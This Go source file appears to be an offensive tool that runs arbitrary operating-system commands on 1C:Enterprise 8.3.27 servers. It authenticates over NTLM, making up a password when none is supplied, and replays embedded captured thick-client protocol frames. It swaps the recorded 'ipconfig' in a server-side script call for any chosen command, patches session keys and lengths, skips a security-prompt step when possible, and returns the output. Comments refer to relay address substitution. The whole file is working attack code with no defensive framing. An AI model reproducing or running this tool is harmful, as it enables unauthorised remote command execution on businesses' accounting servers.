package agent

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"html"
	"net"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/klauspost/compress/zstd"
)

//go:embed thick_frames.json
var thickFramesJSON []byte

var (
	vrsSessionPattern     = regexp.MustCompile(`vrs-session: [A-Za-z0-9+/=]+`)
	contentLengthPattern  = regexp.MustCompile(`Content-Length: \d+`)
	textContentPattern    = regexp.MustCompile(`(?s)<textContent>(.*?)</textContent>`)
	descriptionPattern    = regexp.MustCompile(`(?s)<descr[^>]*>(.*?)</descr>`)
	remoteKeyPattern      = regexp.MustCompile(`(?i)<remotekey>([0-9a-f-]{36})`)
	formVersionPattern    = regexp.MustCompile(`(?i)v.{0,3}=.{0,3}"([0-9a-f]{32})`)
	moduleVersionPattern  = regexp.MustCompile(`(?i)version='([0-9a-f]{32})`)
	vrsStatPattern        = regexp.MustCompile(`vrs-stat: [^\r\n]+\r\n`)
	sessionErrorIDPattern = regexp.MustCompile(`ID=([0-9a-fA-F-]{36})`)
)

type ExecuteCommandConfig struct {
	ClusterName string
	ClusterPort int
	InfoBase    string
	Command     string
}

type ExecuteCommandResult struct {
	WorkerEndpoint string
	Output         string
}

func (client Client) ExecuteCommand(ctx context.Context, endpoint, username, password, workstation string, config ExecuteCommandConfig, timeout time.Duration) (ExecuteCommandResult, error) {
	var result ExecuteCommandResult
	if config.InfoBase == "" || config.Command == "" {
		return result, fmt.Errorf("укажите имя ИБ и команду")
	}
	if password == "" {
		generatedPassword, err := newProtocolUUID()
		if err != nil {
			return result, fmt.Errorf("генерация пароля NTLM: %w", err)
		}
		password = generatedPassword
	}
	inspection, err := client.Authenticate(ctx, endpoint, username, password, workstation, timeout)
	if err != nil {
		return result, err
	}
	if !strings.HasPrefix(inspection.PlatformVersion, "8.3.27.") {
		return result, fmt.Errorf("выполнение EPF пока поддерживается только для 1С 8.3.27, обнаружена версия %s", inspection.PlatformVersion)
	}
	var cluster *ClusterInfo
	for index := range inspection.Clusters {
		if inspection.Clusters[index].Name == config.ClusterName {
			cluster = &inspection.Clusters[index]
			break
		}
	}
	if cluster == nil {
		return result, fmt.Errorf("кластер %q не найден", config.ClusterName)
	}
	if config.ClusterPort == 0 {
		config.ClusterPort = cluster.Port
	}
	if config.ClusterPort == 0 {
		return result, fmt.Errorf("порт кластера %q не определён", config.ClusterName)
	}

	clusterEndpoint := thickWorkerPort(endpoint, config.ClusterPort)
	workerEndpoint, err := connectThickCluster(ctx, clusterEndpoint, config.InfoBase, inspection.PlatformVersion, workstation, timeout)
	if err != nil {
		return result, err
	}
	result.WorkerEndpoint = workerEndpoint
	session, err := openThickWorker(ctx, workerEndpoint, config.InfoBase, username, password, workstation, inspection.PlatformVersion, timeout)
	if err != nil {
		return result, err
	}
	defer session.connection.Close()
	output, err := replayThickSession(session, config.Command, workerEndpoint)
	if err != nil {
		return result, err
	}
	result.Output = output
	return result, nil
}

func replayThickSession(session *thickSession, command, workerEndpoint string) (string, error) {
	targetHost, _, err := net.SplitHostPort(workerEndpoint)
	if err != nil {
		return "", err
	}
	if len(targetHost) != len("192.168.153.132") {
		return "", fmt.Errorf("подмена адреса relay в кадрах не поддерживается")
	}
	encodedFrames := make([]string, 0, 32)
	if err := json.Unmarshal(thickFramesJSON, &encodedFrames); err != nil {
		return "", err
	}
	decoder, err := zstd.NewReader(nil)
	if err != nil {
		return "", err
	}
	defer decoder.Close()
	encoder, err := zstd.NewWriter(nil)
	if err != nil {
		return "", err
	}
	defer encoder.Close()

	remoteKey, err := newProtocolUUID()
	if err != nil {
		return "", err
	}
	remoteKeyCaptured := false
	formVersion := "4d9ff3b8edfe324481f5cd7e62f880d2"
	moduleVersion := "66ef1366bf7d1f4f85ae9ddfe24f65d5"
	commandResponses := 0
	lastOutput := ""
	var previousResponse []byte
	for index, encoded := range encodedFrames {
		frame, err := base64.StdEncoding.DecodeString(encoded)
		if err != nil {
			return "", err
		}
		frame = withSessionID(frame, session.id)
		frame = bytes.ReplaceAll(frame, []byte("192.168.153.132"), []byte(targetHost))
		frame = bytes.ReplaceAll(frame, []byte("4d9ff3b8edfe324481f5cd7e62f880d2"), []byte(formVersion))
		frame = bytes.ReplaceAll(frame, []byte("66ef1366bf7d1f4f85ae9ddfe24f65d5"), []byte(moduleVersion))
		frame = bytes.ReplaceAll(frame, []byte("03FB8707-3A8E-4C4C-AD75-8B18BA7F7D47"), []byte(strings.ToUpper(remoteKey)))
		frame = bytes.ReplaceAll(frame, []byte("03fb8707-3a8e-4c4c-ad75-8b18ba7f7d47"), []byte(strings.ToLower(remoteKey)))
		if len(frame) > 20 {
			frame[19] = byte(0xc9 + index)
		}
		if session.token != "" {
			frame = vrsSessionPattern.ReplaceAll(frame, []byte("vrs-session: "+session.token))
		}
		commandFrame := false
		if isCommandFrame(frame) {
			frame, commandFrame, err = replaceThickCommand(frame, command, remoteKey, formVersion, decoder, encoder)
			if err != nil {
				return "", err
			}
			if commandFrame {
				commandResponses++
			}
		}
		if bytes.Contains(frame, []byte("/e1cib/opersec/insert")) && !bytes.Contains(previousResponse, []byte("InteractiveSecurityException")) {
			continue
		}
		if _, err := session.connection.Write(frame); err != nil {
			return "", fmt.Errorf("отправка кадра %d: %w", index+1, err)
		}
		response, err := session.reader.readFrame(maxProtocolFrame)
		if err != nil {
			return "", fmt.Errorf("ответ на кадр %d: %w", index+1, err)
		}
		previousResponse = response
		if !remoteKeyCaptured {
			if match := remoteKeyPattern.FindSubmatch(response); match != nil {
				remoteKey = string(match[1])
				remoteKeyCaptured = true
				if versionMatch := formVersionPattern.FindSubmatch(response); versionMatch != nil {
					formVersion = string(versionMatch[1])
				}
				if versionMatch := moduleVersionPattern.FindSubmatch(response); versionMatch != nil {
					moduleVersion = string(versionMatch[1])
				}
			}
		}
		if session.token == "" {
			if match := vrsSessionPattern.Find(response); match != nil {
				session.token = strings.TrimPrefix(string(match), "vrs-session: ")
			}
			if session.token == "" {
				return "", fmt.Errorf("сервер не вернул vrs-session (ответ %s)", response)
			}
		}
		if commandFrame {
			lastOutput = extractCommandOutput(response, decoder)
			if lastOutput == "" {
				if match := sessionErrorIDPattern.FindSubmatch(response); match != nil {
					previousRemoteKey := remoteKey
					remoteKey = string(match[1])
					retryFrame, _, retryErr := replaceThickCommand(frame, command, remoteKey, formVersion, decoder, encoder, previousRemoteKey)
					if retryErr != nil {
						return "", retryErr
					}
					if _, err := session.connection.Write(retryFrame); err != nil {
						return "", err
					}
					response, err = session.reader.readFrame(maxProtocolFrame)
					if err != nil {
						return "", err
					}
					lastOutput = extractCommandOutput(response, decoder)
				}
			}
			if lastOutput != "" {
				return lastOutput, nil
			}
			if commandResponses > 1 {
				return "", fmt.Errorf("команда отклонена сервером: %s", extractCommandError(response, decoder))
			}
		}
	}
	if commandResponses != 2 {
		return "", fmt.Errorf("не удалось сформировать вызов команды")
	}
	return lastOutput, nil
}

func isCommandFrame(frame []byte) bool {
	return bytes.Contains(frame, []byte("POST /e1cib/logForm?cmd=call")) && bytes.Contains(frame, []byte("Content-Encoding: zstd"))
}

func replaceThickCommand(frame []byte, command, remoteKey, formVersion string, decoder *zstd.Decoder, encoder *zstd.Encoder, previousRemoteKey ...string) ([]byte, bool, error) {
	headerStart := bytes.Index(frame, []byte("POST /e1cib/logForm?cmd=call"))
	if headerStart < 0 {
		return nil, false, fmt.Errorf("некорректный HTTP-кадр команды")
	}
	headerEnd := bytes.Index(frame[headerStart:], []byte("\r\n\r\n"))
	if headerEnd < 0 {
		return nil, false, fmt.Errorf("некорректный HTTP-кадр команды")
	}
	headerEnd += headerStart
	header := frame[headerStart:headerEnd]
	lengthMatch := contentLengthPattern.Find(header)
	if lengthMatch == nil {
		return nil, false, fmt.Errorf("не найден Content-Length")
	}
	length, err := strconv.Atoi(strings.TrimPrefix(string(lengthMatch), "Content-Length: "))
	if err != nil {
		return nil, false, err
	}
	bodyStart := headerEnd + 4
	if bodyStart+length > len(frame) {
		return nil, false, fmt.Errorf("некорректный размер тела команды")
	}
	body, err := decoder.DecodeAll(frame[bodyStart:bodyStart+length], nil)
	if err != nil {
		return nil, false, err
	}
	if !bytes.Contains(body, []byte("ВыполнитьКомандуСкриптаНаСервере")) {
		return frame, false, nil
	}
	body = bytes.ReplaceAll(body, []byte("4d9ff3b8edfe324481f5cd7e62f880d2"), []byte(formVersion))
	body = bytes.ReplaceAll(body, []byte("03FB8707-3A8E-4C4C-AD75-8B18BA7F7D47"), []byte(strings.ToUpper(remoteKey)))
	body = bytes.ReplaceAll(body, []byte("03fb8707-3a8e-4c4c-ad75-8b18ba7f7d47"), []byte(strings.ToLower(remoteKey)))
	if len(previousRemoteKey) > 0 && previousRemoteKey[0] != "" {
		body = bytes.ReplaceAll(body, []byte(strings.ToUpper(previousRemoteKey[0])), []byte(strings.ToUpper(remoteKey)))
		body = bytes.ReplaceAll(body, []byte(strings.ToLower(previousRemoteKey[0])), []byte(strings.ToLower(remoteKey)))
	}
	body = bytes.ReplaceAll(body, []byte("ipconfig"), []byte(html.EscapeString(command)))
	compressed := encoder.EncodeAll(body, nil)
	header = vrsStatPattern.ReplaceAll(header, nil)
	header = contentLengthPattern.ReplaceAll(header, []byte("Content-Length: "+strconv.Itoa(len(compressed))))
	result := append([]byte(nil), frame[:headerStart]...)
	result = append(result, header...)
	result = append(result, []byte("\r\n\r\n")...)
	result = append(result, compressed...)
	result = append(result, frame[bodyStart+length:]...)
	if headerStart >= 2 {
		binary.LittleEndian.PutUint16(result[headerStart-2:headerStart], uint16(len(result)-112))
	}
	return result, true, nil
}

func extractCommandOutput(frame []byte, decoder *zstd.Decoder) string {
	headerStart := bytes.Index(frame, []byte("HTTP/1.1 200 OK"))
	if headerStart < 0 {
		return ""
	}
	headerEnd := bytes.Index(frame[headerStart:], []byte("\r\n\r\n"))
	if headerEnd < 0 {
		return ""
	}
	headerEnd += headerStart
	header := frame[headerStart:headerEnd]
	lengthMatch := contentLengthPattern.Find(header)
	if lengthMatch == nil {
		return ""
	}
	length, err := strconv.Atoi(strings.TrimPrefix(string(lengthMatch), "Content-Length: "))
	if err != nil {
		return ""
	}
	bodyStart := headerEnd + 4
	if bodyStart+length > len(frame) {
		return ""
	}
	body, err := decoder.DecodeAll(frame[bodyStart:bodyStart+length], nil)
	if err != nil {
		return ""
	}
	matches := textContentPattern.FindAllSubmatch(body, -1)
	parts := make([]string, 0, len(matches))
	for _, match := range matches {
		text := strings.TrimSpace(html.UnescapeString(string(match[1])))
		if text != "" {
			parts = append(parts, text)
		}
	}
	return strings.Join(parts, "\n")
}

func extractCommandError(frame []byte, decoder *zstd.Decoder) string {
	headerStart := bytes.Index(frame, []byte("HTTP/1.1 "))
	if headerStart < 0 {
		return "неизвестная ошибка протокола"
	}
	headerEnd := bytes.Index(frame[headerStart:], []byte("\r\n\r\n"))
	if headerEnd < 0 {
		return "неизвестная ошибка протокола"
	}
	headerEnd += headerStart
	lengthMatch := contentLengthPattern.Find(frame[headerStart:headerEnd])
	if lengthMatch == nil {
		return "неизвестная ошибка протокола"
	}
	length, err := strconv.Atoi(strings.TrimPrefix(string(lengthMatch), "Content-Length: "))
	if err != nil {
		return "неизвестная ошибка протокола"
	}
	bodyStart := headerEnd + 4
	if bodyStart+length > len(frame) {
		return "неизвестная ошибка протокола"
	}
	body := frame[bodyStart : bodyStart+length]
	if bytes.Contains(frame[headerStart:headerEnd], []byte("Content-Encoding: zstd")) {
		body, err = decoder.DecodeAll(body, nil)
		if err != nil {
			return "неизвестная ошибка протокола"
		}
	}
	if match := descriptionPattern.FindSubmatch(body); match != nil {
		return strings.TrimSpace(html.UnescapeString(string(match[1])))
	}
	return strings.TrimSpace(string(body))
}
